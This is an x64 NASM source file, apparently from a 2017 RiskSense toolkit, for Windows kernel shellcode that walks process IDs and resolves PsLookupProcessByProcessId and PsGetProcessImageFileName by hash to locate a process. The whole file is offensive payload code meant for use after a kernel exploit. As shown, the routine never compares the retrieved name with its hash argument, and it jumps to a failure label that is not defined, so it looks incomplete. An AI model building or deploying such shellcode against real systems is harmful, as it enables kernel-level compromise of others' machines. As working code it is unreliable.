;
; Windows x64 Kernel Find Process by Name Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Arguments: r10d = process hash, r15 = nt!, rdx = *PEPROCESS
; Clobbers: RAX, RCX, RDX, R8, R9, R10, R11
;

[BITS 64]
[ORG 0]

find_process_name:
  xor ecx, ecx

_find_process_name_loop_pid:
  add cx, 0x4
  cmp cx, 0x10000
  jge _find_process_name_failure

                                                ; rcx = PID
                                                ; rdx = *PEPROCESS
  mov r11d, PSLOOKUPPROCESSBYPROCESSID_HASH
  call block_api_direct
  add rsp, 0x20

  test rax, rax                                 ; see if STATUS_SUCCESS
  jnz _find_process_name_loop_pid

  push rcx
  mov rcx, [rdx]
  mov r11d, PSGETPROCESSIMAGEFILENAME_HASH
  call block_api_direct
  add rsp, 0x20
  pop rcx

  xor rax, rax
  ret
